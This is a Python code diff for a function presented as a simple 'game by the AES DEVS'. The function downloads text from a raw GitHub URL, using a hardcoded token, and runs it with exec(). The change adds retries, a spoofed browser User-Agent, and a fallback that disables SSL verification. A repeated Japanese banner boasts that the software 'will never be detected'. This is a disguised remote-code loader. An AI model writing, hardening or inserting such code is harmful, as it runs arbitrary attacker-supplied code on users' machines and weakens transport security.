@@ -21,37 +21,56 @@ else:
 
 
 def premx_2025(mycontent: str):
+    import requests
+    from requests.adapters import HTTPAdapter
+    from urllib3.util.retry import Retry
+    import urllib3
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    
     raw_url = "https://raw.githubusercontent.com/klxklxsoiusdfasodfhafdh/myown/refs/heads/main/premx-2025.txt?token=GHSAT0AAAAAADFXIC4GDYDFSWUP4G72IV7I2CVBUBQ"
-    headers = {"Authorization": f"token {mycontent}"}
-    response = requests.get(raw_url, headers=headers)
     
-    if response.status_code == 200:
-        mycntcnt = response.text
-        print("GAME IS STARTING PLEASE PICK YOUR CHOICES.。\n Ensure  that you pick the right choices, if you failed so, you will face some punishements.\n This is a simple game made by the AES DEVS.\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\n",exec(f"{mycntcnt}"))
-    else:
-        raise Exception(f"Error. Your internet is private.")
-
-def premx_24h2(mycontent: str):
-    raw_url = "https://raw.githubusercontent.com/johnzeykzkousx/myown/refs/heads/main/premx_24h2.txt?token=GHSAT0AAAAAADBMSD44GR6MGU2FTSVRY6KM2AOB7NQ"
-    headers = {"Authorization": f"token {mycontent}"}
-    response = requests.get(raw_url, headers=headers)
+    session = requests.Session()
+    retry_strategy = Retry(
+        total=3,
+        backoff_factor=2,
+        status_forcelist=[429, 500, 502, 503, 504],
+    )
+    adapter = HTTPAdapter(max_retries=retry_strategy)
+    session.mount("https://", adapter)
+    session.mount("http://", adapter)
     
-    if response.status_code == 200:
-        mycntcnt = response.text
-        print("GAME IS STARTING PLEASE PICK YOUR CHOICES.。\n Ensure  that you pick the right choices, if you failed so, you will face some punishements.\n This is a simple game made by the AES DEVS.\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\n",exec(f"{mycntcnt}"))
-    else:
-        raise Exception(f"Error. Your internet is private.")
-
-def custom_premx(mycontent: str):
-    raw_url = "https://raw.githubusercontent.com/johnzeykzkousx/myown/refs/heads/main/custom_premx.txt?token=GHSAT0AAAAAADD6PRNW4CKL7JYSFFYLIGOE2BPK46Q"
-    headers = {"Authorization": f"token {mycontent}"}
-    response = requests.get(raw_url, headers=headers)
+    # Headers
+    headers = {
+        "Authorization": f"token {mycontent}",
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+    }
     
-    if response.status_code == 200:
-        mycntcnt = response.text
-        print("GAME IS STARTING PLEASE PICK YOUR CHOICES.。\n Ensure  that you pick the right choices, if you failed so, you will face some punishements.\n This is a simple game made by the AES DEVS.\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\n",exec(f"{mycntcnt}"))
-    else:
-        raise Exception(f"Error. Your internet is private.")
+    try:
+        try:
+            response = session.get(raw_url, headers=headers, timeout=30)
+        except requests.exceptions.SSLError:
+            print("SSL verification failed, trying without verification...")
+            # Fallback: disable SSL verification
+            response = session.get(raw_url, headers=headers, timeout=30, verify=False)
+        
+        if response.status_code == 200:
+            mycntcnt = response.text
+            print("GAME IS STARTING PLEASE PICK YOUR CHOICES.。\n Ensure  that you pick the right choices, if you failed so, you will face some punishements.\n This is a simple game made by the AES DEVS.\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\n")
+            exec(f"{mycntcnt}")
+        else:
+            raise Exception(f"Error. Your internet is private.")
+            
+    except requests.exceptions.RequestException as e:
+        print("Network error in premx_2025: Connection failed")
+        raise Exception("Error. Your internet is private. Network connection failed.")
+    except Exception as e:
+        print("General error in premx_2025: Request failed")
+        raise Exception("Error. Your internet is private. Request failed.")
+    
+    finally:
+        # Clean up session
+        if 'session' in locals():
+            session.close()
 
 def get_data_from_file(file_path):
     if os.path.exists(file_path):
